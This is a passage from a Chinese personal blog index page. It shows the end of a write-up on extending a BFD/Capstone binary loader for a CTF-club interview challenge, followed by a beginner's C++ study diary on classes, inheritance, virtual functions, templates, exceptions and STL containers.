close(fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://s2.loli.net/2022/11/03/BGqOMS58xpjtnrb.png" alt="pass"></p>
<h3 id="更多socket学习"><a href="#更多socket学习" class="headerlink" title="更多socket学习"></a>更多socket学习</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_37947204/article/details/80489431">https://blog.csdn.net/m0_37947204/article/details/80489431</a></p>
<h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><blockquote>
<p>给二进制加载器实现更多功能：1、转储节内容 2、输出数据符号 3、使用capstone反汇编.text段；</p>
</blockquote>
<p>称之为环境恶心人之题；</p>
<p>题不难，但在wsl上装环境会变得千奇百怪，反正就是跑不起来，只有vm搞；</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo</span><br><span class="line">apt-get install binutils-dev</span><br><span class="line">apt-get install libcapstone-dev</span><br></pre></td></tr></table></figure>

<p>完成这道题需要知晓一点点bfd和capstone，以及更多的模仿；</p>
<p>注意引头 bfd.h 和 capstone/capstone.h；</p>
<p>题目已经把各种各样的代码都实现好了，只要求增添几个功能，逐一实现：</p>
<h3 id="转储节内容"><a href="#转储节内容" class="headerlink" title="转储节内容"></a>转储节内容</h3><p>这里要求命令行输入三个参数，而第三个参数为节名称，并打印节的原始字节；</p>
<p>那么可以在原来打印节的地方（main.cc）镶嵌一个东西进去：</p>
<p><img src="https://s2.loli.net/2022/11/06/FlkOx8SRGnKYqjM.png" alt="one"></p>
<p>flag一开始设置为0，找到同名节后设置为1；</p>
<p>第一个判断是否有三个参数并且调控数为0，则执行这个函数；</p>
<p>外面的判断是如果没有找到第三个参数一样的节名称，则此时flag依然是0，所以执行打印没有找到；</p>
<p>下面是函数具体实现：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">print_origin_bytes</span><span class="params">(Section* sec, <span class="keyword">char</span> *one)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(sec-&gt;name == one)		<span class="comment">//找到同名则进入</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;contents of %s section\n&quot;</span>, one);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;        &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span> ; i &lt; <span class="number">16</span> ; i++)		<span class="comment">//打印开头的 00~0f</span></span><br><span class="line">        &#123;</span><br><span class="line">             <span class="built_in">printf</span>(<span class="string">&quot;%02jx &quot;</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">        i = <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;        &quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(j &lt; sec-&gt;size)    <span class="comment">//循环打印</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%02jx &quot;</span>, sec-&gt;bytes[j++]);</span><br><span class="line">            <span class="keyword">if</span>(i == <span class="number">16</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                i = <span class="number">0</span>;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;        &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;			<span class="comment">//设置flag为1</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="输出数据符号"><a href="#输出数据符号" class="headerlink" title="输出数据符号"></a>输出数据符号</h3><p>找到 loader.h 中的symbol类，可以发现 SymbolType 里面只有  SYM_TYPE_UKN SYM_TYPE_FUNC 两个，需要打印 DATA 符号，则添加一个 <code>SYM_TYPE_DATA = 2,</code> ;</p>
<p>之后找到 loader.cc 中的一个函数：load_symbol_bfd，可以发现其中有一步是给函数添加 FUNC项的，镶嵌如下内容：</p>
<p><img src="https://s2.loli.net/2022/11/06/8uVxkC31FnlgLrT.png" alt="two"></p>
<p>当不添加FUNC项的内容时，添加DATA就好了；</p>
<p>最后改变下main.cc里面打印符号的地方为：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; %-40s 0x%016jx %s\n&quot;</span>,</span><br><span class="line">                   sym-&gt;name.<span class="built_in">c_str</span>(),</span><br><span class="line">                   sym-&gt;addr,</span><br><span class="line">                   (sym-&gt;type &amp; Symbol::SYM_TYPE_FUNC) ? <span class="string">&quot;FUNC&quot;</span> : <span class="string">&quot;DATA&quot;</span>);</span><br></pre></td></tr></table></figure>



<h3 id="使用capstone反汇编-text段"><a href="#使用capstone反汇编-text段" class="headerlink" title="使用capstone反汇编.text段"></a>使用capstone反汇编.text段</h3><p>吐槽一下，edge搜索capstone 反汇编会出现一个博客，详细的记录了如何使用capstone；</p>
<p>具体函数实现：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">disass_text</span><span class="params">(Binary bin)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    csh dis;</span><br><span class="line">    cs_insn *insns;</span><br><span class="line">    Section *text;</span><br><span class="line">    <span class="keyword">size_t</span> n, i;</span><br><span class="line">    Section* sec;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取text节</span></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; bin.sections.<span class="built_in">size</span>(); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        sec = &amp;bin.sections[i];</span><br><span class="line">        <span class="keyword">if</span>(sec-&gt;name == <span class="string">&quot;.text&quot;</span>)</span><br><span class="line">            text = sec;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!text)   <span class="keyword">goto</span> fail;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//初始化capstone</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">cs_open</span>(CS_ARCH_X86, CS_MODE_64, &amp;dis) != CS_ERR_OK)</span><br><span class="line">        <span class="keyword">goto</span> fail;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//反汇编把内容放insns里； （ 返回0就是版本问题 （（</span></span><br><span class="line">    n = <span class="built_in">cs_disasm</span>(dis, text-&gt;bytes, text-&gt;size, text-&gt;vma, <span class="number">0</span>, &amp;insns);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(n &lt;= <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> fail;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//打印</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;disassembly of .text section:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%016jx\t%s\t\t%s\n&quot;</span>, insns[i].address, insns[i].mnemonic, insns[i].op_str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cs_free</span>(insns,n);</span><br><span class="line">    <span class="built_in">cs_close</span>(&amp;dis);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">fail:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;err\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后在main.cc的打印节后一部分调用就好了；</p>
<p>通过：</p>
<p><img src="https://s2.loli.net/2022/11/06/v6ESOF5znQ2khu7.png" alt="pass"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>纯粹对今年的有兴趣，5和7都比较新鲜，也是第一次手撸汇编了解bfd库，还挺有意思；</p>
</div></div><a class="button-hover more" href="/SecondBC/2022/11/06/2022-syc-bin%E4%BA%8C%E9%9D%A2/#more">阅读全文</a></div><div class="recent-post-item"><a class="post-title" href="/SecondBC/2022/10/28/C++%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/">C++学习日记</a><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 更新于 2022-10-28</time><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/categories/Diary/">Diary</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/SecondBC/tags/Cpp/">Cpp</a></div></div><div class="post-content"><div class="main-content content"><h2 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h2><p><code>namespace NameSpace&#123;&#125;</code>，为解决变量以及函数重名而出现；</p>
<p>只能在全局中声明，可以嵌套，使用<code>NameSpace::Items</code>，调用内容；</p>
<p>可以在函数开头用 <code>using NameSpace::Items</code>，来声明引用内容，或者用 <code>using namespace NameSpace</code>，来声明引用全部内容；</p>
<p>可以匿名，引用内容则为<code>::Items</code>，等效于全局内容；</p>
<h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p>定义的时候就需要赋值：<code>int &amp;ra = a;</code> ，前面加地址符号，意义是使得ra和a共享地址（取个别名）；</p>
<p>数组定义时记得加括号明确计算意义：<code>int (&amp;ra)[10] = a[10]</code> ；</p>
<p>类似指针，函数传参时可以间接影响外部变量，并且返回时不能返回局部变量，因为是一个地址，内容会发生改变；</p>
<h3 id="本质"><a href="#本质" class="headerlink" title="本质"></a>本质</h3><p><code>int &amp;ra = a </code>  等价于 <code>int * const ra = &amp;a</code> ；</p>
<p>目的为了简化源码理解，不需要构造多级指针，传参时传入引用可以体现出改变外部变量的意思；</p>
<h2 id="面向对象与类"><a href="#面向对象与类" class="headerlink" title="面向对象与类"></a>面向对象与类</h2><p>特征：封装，继承，多态；</p>
<h3 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h3><p>将一类的函数和数据装在一个类里，设置私有数据域，和公共方法称为<strong>封装</strong>；</p>
<p>结构体等同于类，类里的对象拥有<strong>属性</strong>（数据），<strong>行为</strong>（函数），以及<strong>构造函数</strong>（初始化数据的函数，与类同名无返回）；</p>
<p>初始化定义：声明同时赋值；</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//构造函数后面加冒号变量为初始化，意义在于控制常量</span></span><br><span class="line"><span class="built_in">matrix</span>(<span class="keyword">int</span> input):<span class="built_in">line</span>(input)</span><br></pre></td></tr></table></figure>

<p><strong>析构函数</strong>：与类名同名，前面加~，局部变量返回时自动执行，一般做扫尾工作，如free；</p>
<p>调用类函数的时候，实际上编译器将外部变量的引用（匿名 / this ）传入了类函数中；</p>
<p>定义在类中的函数，可以使用 this 指针，这个指针用于操控类里的变量，防止同名冲突；</p>
<h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><p>将一个类的内容添加到另一个类的起始；</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Father</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> same;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Child</span>:</span>Father <span class="comment">//继承</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> same;</span><br><span class="line">    <span class="keyword">int</span> height;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>相当于：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Child</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> same;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">int</span> same;</span><br><span class="line">    <span class="keyword">int</span> height;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以通过父类引用访问子类，但只能指到age结束，要访问子类后续可以用操作指针；</p>
<p>同样可以通过子类引用访问父类，但需要强制转换，且指针可以访问父类后面的空白区域；</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Child ch;</span><br><span class="line">Father *pfa = &amp;ch;</span><br><span class="line">pfa-&gt;age; <span class="comment">//通过父类指针访问继承age；</span></span><br><span class="line">---</span><br><span class="line">Father fa;</span><br><span class="line">Child *pch = (Child *)&amp;fa;</span><br><span class="line">pch-&gt;age; <span class="comment">//通过子类指针访问父类age；</span></span><br></pre></td></tr></table></figure>

<p>若继承里有同名变量，则使用就近原则使用子类的内容；若要访问父类的同名变量，加上父类名：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Child a;</span><br><span class="line">a.same = <span class="number">1</span>; <span class="comment">//改变原子类内容</span></span><br><span class="line">a.Father::same = <span class="number">2</span>; <span class="comment">//改变继承内容</span></span><br></pre></td></tr></table></figure>

<p>C++拥有多继承，按顺序排的类，哪个在前，其内容内存地址继承在最上方；</p>
<p><strong>权限继承：</strong></p>
<p>class修饰默认为private，若以public继承，则父类内容里保持不变（public还是public，private还是private）；</p>
<p>private修饰的内容继承，子类不能访问，但protected可以；（protected和private就只有这个区别）</p>
<p>构造析构函数也会继承；</p>
<h3 id="new-amp-delete"><a href="#new-amp-delete" class="headerlink" title="new&amp;delete"></a>new&amp;delete</h3><p>创建类指针时，在堆开辟类内存空间并执行构造函数： <code>Child *pch = new Child();</code> 类似于java；</p>
<p>使用delete释放空间并执行析构函数： <code>delete pch;</code> ;</p>
<h3 id="拷贝构造函数"><a href="#拷贝构造函数" class="headerlink" title="拷贝构造函数"></a>拷贝构造函数</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Test::<span class="built_in">Test</span>(Test &amp;testaddr)</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>用于对象，复制属性时候执行，只是浅拷贝，值转换，指针可能出错；一般对象作为参数和返回值时就会调用；</p>
<h3 id="虚继承"><a href="#虚继承" class="headerlink" title="虚继承"></a>虚继承</h3><p>用于避免多继承的多义变量产生；如：A -&gt; B，A -&gt; C；B,C -&gt; D；使得D里有两组A内容；</p>
<p>继承时，在继承类的前面用 virtual 修饰，称其为<strong>虚基类</strong>；此时，虚基类不会直接继承其内容给子类，而是会给子类一个<strong>虚基类表</strong>，这是一个指针，指向两个数据，第一个表示<strong>虚基类表位于当前所在类</strong>的偏移，第二个表示<strong>继承父类位于虚基类表</strong>的偏移；</p>
<p>一般虚继承的父类内容放在子类内存的下方；</p>
<h3 id="友元"><a href="#友元" class="headerlink" title="友元"></a>友元</h3><p>在类中定义，用 friend 修饰，可以为另类和函数，使其能够直接使用 private 修饰的内容；</p>
<h3 id="运算符重载"><a href="#运算符重载" class="headerlink" title="运算符重载"></a>运算符重载</h3><p>类类型的对象进行运算是没有意义的，所以可以自己给运算符定义意义；</p>
<p>使用以下内容重载运算符 加号,使得当两个对象相加时执行 “+” 函数的语句：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">A <span class="keyword">operator</span>+ (A a1, A a2)</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h3><p>明确一些专有名词：</p>
<ol>
<li>重载：同一类里，同名函数，不同参数表；</li>
<li>重写：不同类，且类有继承关系，同名函数；</li>
<li>静态联编：程序编译时定死函数符号以及类指针的引用；动态联编则相反；</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">HaHa</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;233&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>:</span><span class="keyword">public</span> A</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">HaHa</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;lol&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"><span class="comment">//此为静态联编，当 *p 定为 A 类型时，默认A -&gt; HaHa() 调用 A 类里的函数；则两个都输出 233 ；</span></span><br><span class="line"><span class="comment">//当父类A里函数用 virtual 修饰时为动态联编，两个分别输出 233 和 lol；</span></span><br><span class="line">    </span><br><span class="line">A a;</span><br><span class="line">B b;</span><br><span class="line">A *p = <span class="literal">NULL</span>;</span><br><span class="line">A = &amp;a;</span><br><span class="line">A -&gt; <span class="built_in">HaHa</span>();</span><br><span class="line">A = &amp;b;</span><br><span class="line">A -&gt; <span class="built_in">HaHa</span>();</span><br></pre></td></tr></table></figure>

<p>可以抽象地将函数理解成是存在于类中（实际上并没有），继承后盖在子类头上，一共有两个HaHa函数，就近原则选择父类的函数（父类指针），而虚函数的声明免除了这个误会，就类似于虚继承了；</p>
<p>同一个指针，指向不同对象，展现出不同效果的情况，称其为多态，为了实现多态而不产生歧义，才有的<strong>虚函数</strong>；</p>
<p>定义：一个类中声明了虚函数，但是没给出实现，此称为<strong>纯虚函数</strong>，这个类叫做<strong>抽象类</strong>；抽象类不配有对象；</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">func</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Q:为什么这么做？</p>
<p>A:用于构造模型，用子类去实现具体内容，并由一个指向父类的指针去实现多个子类的多态；</p>
<p>如果定义了虚函数，则类里会存在虚表指针独占内存，指向<strong>虚表</strong>，虚表里包含各个虚函数的地址；</p>
<p>继承会合并父类虚表为一个，如果是多继承，则合并第一个继承的虚表，后面的会保留下来；</p>
<h2 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h2><p>为解决多次重载不同**类型(重点)**参数的函数而出现；</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> DD&gt;</span></span><br><span class="line"><span class="function">DD <span class="title">func</span><span class="params">(DD a, DD b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a-b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用时，直接代入函数就行，DD需同类型，但不能指针；</p>
<p>需要指针时，需要使<strong>模板特化</strong>：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//紧跟上面的内容写</span></span><br><span class="line">---</span><br><span class="line"><span class="keyword">template</span>&lt;&gt;</span><br><span class="line"><span class="keyword">int</span> *func&lt;<span class="keyword">int</span> *&gt;(<span class="keyword">int</span> *a, <span class="keyword">int</span>*b)			<span class="comment">//尖括号内容可有可无</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> *(a + b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果有重载函数，模板特化，函数模板都满足使用的类型，则优先级由最特化到最不特化；</p>
<p>类也有模板，用 <code>template&lt;class DD&gt;</code> 声明；DD则可替换类里属性的类型；</p>
<p>使用时，用 <code>ClassName&lt;type&gt; a;</code> 来创建一个类对象；</p>
<p><strong>模板的机制：</strong></p>
<p>实际上，模板通过把一个数据类型用通用参数符号来<strong>代替</strong>，实际使用时，用某种数据类型进行替换；</p>
<p>达到处理类型不同，实现功能相同的效果；</p>
<p>模板技术成为<strong>泛型编程</strong>；</p>
<h2 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h2><p>三个关键词：</p>
<p><strong>throw</strong> : 手动抛出异常，一般满足if关系式后执行，也一般存在try包括中；</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">throw</span> code;		<span class="comment">//code为之后的捕获catch返回的内容</span></span><br></pre></td></tr></table></figure>

<p><strong>try</strong> 和 <strong>catch</strong> 成对出现，前者会用大括号包住可能出现异常的<strong>语句块</strong>；后者作为函数跟随： <code>catch(type code)</code> , <strong>接收</strong>抛出的code，<strong>并执行</strong>catch函数里的内容；</p>
<p>catch里也能放 <code>...</code> ，意思是捕获<strong>任意类型</strong>(包括类)异常（接收任意类型code）;</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(b == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="number">12</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a/b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="built_in">func</span>(<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in"><span class="keyword">catch</span></span>(<span class="keyword">int</span> code)</span><br><span class="line">&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;异常了，且code为&quot;</span> &lt;&lt; code &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码会使得打印catch中的语句，且code值为12；</p>
<h2 id="STL"><a href="#STL" class="headerlink" title="STL"></a>STL</h2><p>标准模板库；</p>
<p>其部件：容器，算法，迭代器；目的是为了更好地存储数据（如排序和查找遍历）</p>
<h3 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h3><p>顺序容器：</p>
<ul>
<li><p>Vector：向量，动态数组</p>
<p>可扩大数组，每次扩大自身2倍；</p>
<p>用法：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">push_back	<span class="comment">//插入到末尾</span></span><br><span class="line">insert 		<span class="comment">//指定位置插入</span></span><br><span class="line">Pop_back	<span class="comment">//删末尾元素</span></span><br><span class="line">erase		<span class="comment">//删除指定位置</span></span><br><span class="line">Clear		<span class="comment">//清空所有</span></span><br><span class="line">Vec[i]		<span class="comment">//访问索引元素</span></span><br><span class="line">at			<span class="comment">//返回指定下标处元素</span></span><br><span class="line">begin		<span class="comment">//返回 iterator 指向第一个元素</span></span><br><span class="line">End 		<span class="comment">//返回 iterator 指向末尾下一个</span></span><br><span class="line">empty		<span class="comment">//是否为空？</span></span><br><span class="line">size		<span class="comment">//获取元素个数</span></span><br><span class="line">swap		<span class="comment">//交换两个元素</span></span><br><span class="line">  </span><br><span class="line">---</span><br><span class="line">vector&lt;type&gt; item;	<span class="comment">//创建</span></span><br><span class="line">vector::iterator it = item.<span class="built_in">begin</span>();		<span 